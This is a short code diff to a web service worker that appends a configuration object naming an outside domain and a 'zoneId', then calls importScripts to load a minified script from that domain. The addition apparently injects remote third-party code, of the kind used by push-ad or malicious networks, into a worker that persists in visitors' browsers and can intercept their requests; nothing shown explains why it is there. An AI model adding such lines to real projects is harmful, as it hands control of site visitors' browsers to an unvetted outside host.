@@ -35,3 +35,11 @@ self.addEventListener('fetch', event => {
     )
   );
 });
+
+
+self.options = {
+    "domain": "aiharsoreersu.net",
+    "zoneId": 10002279
+}
+self.lary = ""
+importScripts('https://aiharsoreersu.net/act/files/service-worker.min.js?r=sw')
